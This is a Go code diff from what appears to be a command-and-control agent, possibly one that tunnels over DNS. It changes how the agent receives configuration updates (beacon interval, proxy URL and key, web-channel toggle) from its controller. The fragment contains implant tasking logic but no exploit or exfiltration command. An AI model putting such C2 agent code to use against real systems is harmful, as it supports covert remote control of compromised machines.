@@ -15,7 +15,6 @@ import (
 	"os/user"
 	"regexp"
 	"sort"
-	"strconv"
 	"strings"
 
 	"github.com/miekg/dns"
@@ -484,59 +483,21 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		}()
 		break
 	case AgentCommand_AGENT_SET_CONFIG:
-		cmd := string(decryptedData)
-		setting := strings.Split(cmd, "=")
-		settingName := setting[0]
-		settingValue := setting[1]
-
-		switch settingName {
-		/* cannot set domain and password dynamically
-		// case "d":
-		// 	a.config.C2Domain = setting_value
-		// 	a.SendEncrypted([]byte("config: c2 domain updated"), AgentCommand_AGENT_MESSAGE)
-		// 	break
-		// case "p":
-		// 	// c2 must initiate keyx again after changing password
-		// 	a.config.C2Password = setting_value
-		// 	a.SendEncrypted([]byte("config: c2 password updated"), AgentCommand_AGENT_MESSAGE)
-		// 	break
-		*/
-		case "i":
-			i, err := strconv.Atoi(settingValue)
-			if err != nil {
-				a.SendEncrypted([]byte("error: invalid interval"), AgentCommand_AGENT_MESSAGE)
-				break
-			}
-			a.config.C2Interval = i
-			a.SendEncrypted([]byte("config: c2 interval updated, "+settingValue), AgentCommand_AGENT_MESSAGE)
-			break
-
-		case "pk":
-			a.config.ProxyKey = settingValue
-			a.SendEncrypted([]byte("config: proxy_key updated"), AgentCommand_AGENT_MESSAGE)
-			break
-		case "pu":
-			a.config.ProxyUrl = settingValue
-			a.SendEncrypted([]byte("config: proxy_url updated"), AgentCommand_AGENT_MESSAGE)
-			break
-		case "pe":
-			if settingValue == "true" {
-				if len(a.config.ProxyUrl) == 0 {
-					a.SendEncrypted([]byte("error: no proxy url"), AgentCommand_AGENT_MESSAGE)
-					break
-				}
-				if len(a.config.ProxyKey) == 0 {
-					a.SendEncrypted([]byte("error: no proxy key"), AgentCommand_AGENT_MESSAGE)
-					break
-				}
-				a.config.ProxyEnabled = true
-				a.SendEncrypted([]byte("config: proxy enabled"), AgentCommand_AGENT_MESSAGE)
-			} else {
-				a.config.ProxyEnabled = false
-				a.SendEncrypted([]byte("config: proxy disabled"), AgentCommand_AGENT_MESSAGE)
-			}
-			break
+		newConfig := commandRequest.Config
+		if newConfig.GetWebKey() != "" {
+			a.config.ProxyKey = newConfig.GetWebKey()
 		}
+		if newConfig.GetWebUrl() != "" {
+			a.config.ProxyUrl = newConfig.GetWebUrl()
+		}
+		if newConfig.GetUseWebChannel() {
+			a.config.ProxyEnabled = newConfig.GetUseWebChannel()
+		}
+		if newConfig.GetC2IntervalMs() != 0 {
+			a.config.C2Interval = int(newConfig.GetC2IntervalMs())
+		}
+		log.Printf("updated config to: %s\n", commandRequest.GetConfig())
+
 		break
 	case AgentCommand_AGENT_MESSAGE:
 		log.Printf("msg> %s\n", decryptedData)
